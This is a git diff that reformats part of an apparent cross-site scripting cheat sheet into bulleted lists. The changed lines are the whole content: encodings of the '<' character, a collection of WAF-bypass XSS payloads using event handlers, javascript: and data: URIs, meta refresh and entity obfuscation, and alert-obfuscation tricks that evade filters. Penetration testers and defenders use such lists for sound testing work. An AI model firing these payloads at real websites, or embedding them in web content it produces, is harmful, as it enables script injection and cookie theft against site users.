@@ -823,76 +823,76 @@ As a result, in this example the main flaw is trusting the content_type in the "
 
 All the possible combinations of the character "\<" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.
 
-`<`
-`%3C`
-`&lt`
-`&lt;`
-`&LT`
-`&LT;`
-`&#60`
-`&#060`
-`&#0060`
-`&#00060`
-`&#000060`
-`&#0000060`
-`&#60;`
-`&#060;`
-`&#0060;`
-`&#00060;`
-`&#000060;`
-`&#0000060;`
-`&#x3c`
-`&#x03c`
-`&#x003c`
-`&#x0003c`
-`&#x00003c`
-`&#x000003c`
-`&#x3c;`
-`&#x03c;`
-`&#x003c;`
-`&#x0003c;`
-`&#x00003c;`
-`&#x000003c;`
-`&#X3c`
-`&#X03c`
-`&#X003c`
-`&#X0003c`
-`&#X00003c`
-`&#X000003c`
-`&#X3c;`
-`&#X03c;`
-`&#X003c;`
-`&#X0003c;`
-`&#X00003c;`
-`&#X000003c;`
-`&#x3C`
-`&#x03C`
-`&#x003C`
-`&#x0003C`
-`&#x00003C`
-`&#x000003C`
-`&#x3C;`
-`&#x03C;`
-`&#x003C;`
-`&#x0003C;`
-`&#x00003C;`
-`&#x000003C;`
-`&#X3C`
-`&#X03C`
-`&#X003C`
-`&#X0003C`
-`&#X00003C`
-`&#X000003C`
-`&#X3C;`
-`&#X03C;`
-`&#X003C;`
-`&#X0003C;`
-`&#X00003C;`
-`&#X000003C;`
-`\x3c`
-`\x3C`
-`\u003c`
-`\u003C`
+- `<`
+- `%3C`
+- `&lt`
+- `&lt;`
+- `&LT`
+- `&LT;`
+- `&#60`
+- `&#060`
+- `&#0060`
+- `&#00060`
+- `&#000060`
+- `&#0000060`
+- `&#60;`
+- `&#060;`
+- `&#0060;`
+- `&#00060;`
+- `&#000060;`
+- `&#0000060;`
+- `&#x3c`
+- `&#x03c`
+- `&#x003c`
+- `&#x0003c`
+- `&#x00003c`
+- `&#x000003c`
+- `&#x3c;`
+- `&#x03c;`
+- `&#x003c;`
+- `&#x0003c;`
+- `&#x00003c;`
+- `&#x000003c;`
+- `&#X3c`
+- `&#X03c`
+- `&#X003c`
+- `&#X0003c`
+- `&#X00003c`
+- `&#X000003c`
+- `&#X3c;`
+- `&#X03c;`
+- `&#X003c;`
+- `&#X0003c;`
+- `&#X00003c;`
+- `&#X000003c;`
+- `&#x3C`
+- `&#x03C`
+- `&#x003C`
+- `&#x0003C`
+- `&#x00003C`
+- `&#x000003C`
+- `&#x3C;`
+- `&#x03C;`
+- `&#x003C;`
+- `&#x0003C;`
+- `&#x00003C;`
+- `&#x000003C;`
+- `&#X3C`
+- `&#X03C`
+- `&#X003C`
+- `&#X0003C`
+- `&#X00003C`
+- `&#X000003C`
+- `&#X3C;`
+- `&#X03C;`
+- `&#X003C;`
+- `&#X0003C;`
+- `&#X00003C;`
+- `&#X000003C;`
+- `\x3c`
+- `\x3C`
+- `\u003c`
+- `\u003C`
 
 # Methods to Bypass WAF – Cross-Site Scripting
 
@@ -944,43 +944,43 @@ header('Refresh: 0; URL='.$_GET['param']);
 
 ## WAF ByPass Strings for XSS.
 
-`<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
-`<Video> <source onerror = "javascript: alert (XSS)">`
-`<Input value = "XSS" type = text>`
-`<applet code="javascript:confirm(document.cookie);">`
-`<isindex x="javascript:" onmouseover="alert(XSS)">`
-`"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
-`"><img src="x:x" onerror="alert(XSS)">`
-`"><iframe src="javascript:alert(XSS)">`
-`<object data="javascript:alert(XSS)">`
-`<isindex type=image src=1 onerror=alert(XSS)>`
-`<img src=x:alert(alt) onerror=eval(src) alt=0>`
-`<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
-`<iframe/src="data:text/html,<svg onload=alert(1)>">`
-`<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
-`<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
-`<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
-`<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
-`<form><a href="javascript:\u0061lert(1)">X`
-`</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
-`<style>//*{x:expression(alert(/xss/))}//<style></style>`
-On Mouse Over​
-`<img src="/" =_=" title="onerror='prompt(1)'">`
-`<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
-`<script x> alert(1) </script 1=2`
-`<form><button formaction=javascript&colon;alert(1)>CLICKME`
-`<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
-`<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
-`<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
+- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
+- `<Video> <source onerror = "javascript: alert (XSS)">`
+- `<Input value = "XSS" type = text>`
+- `<applet code="javascript:confirm(document.cookie);">`
+- `<isindex x="javascript:" onmouseover="alert(XSS)">`
+- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
+- `"><img src="x:x" onerror="alert(XSS)">`
+- `"><iframe src="javascript:alert(XSS)">`
+- `<object data="javascript:alert(XSS)">`
+- `<isindex type=image src=1 onerror=alert(XSS)>`
+- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
+- `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
+- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
+- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
+- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
+- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
+- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
+- `<form><a href="javascript:\u0061lert(1)">X`
+- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
+- `<style>//*{x:expression(alert(/xss/))}//<style></style>`
+- On Mouse Over​
+- `<img src="/" =_=" title="onerror='prompt(1)'">`
+- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
+- `<script x> alert(1) </script 1=2`
+- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
+- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
+- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
+- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
 
 ## Filter Bypass Alert Obfuscation
 
-`(alert)(1)`
-`a=alert,a(1)`
-`[1].find(alert)`
-`top[“al”+”ert”](1)`
-`top[/al/.source+/ert/.source](1)`
-`al\u0065rt(1)`
-`top[‘al\145rt’](1)`
-`top[‘al\x65rt’](1)`
-`top[8680439..toString(30)](1)`
+- `(alert)(1)`
+- `a=alert,a(1)`
+- `[1].find(alert)`
+- `top[“al”+”ert”](1)`
+- `top[/al/.source+/ert/.source](1)`
+- `al\u0065rt(1)`
+- `top[‘al\145rt’](1)`
+- `top[‘al\x65rt’](1)`
+- `top[8680439..toString(30)](1)`
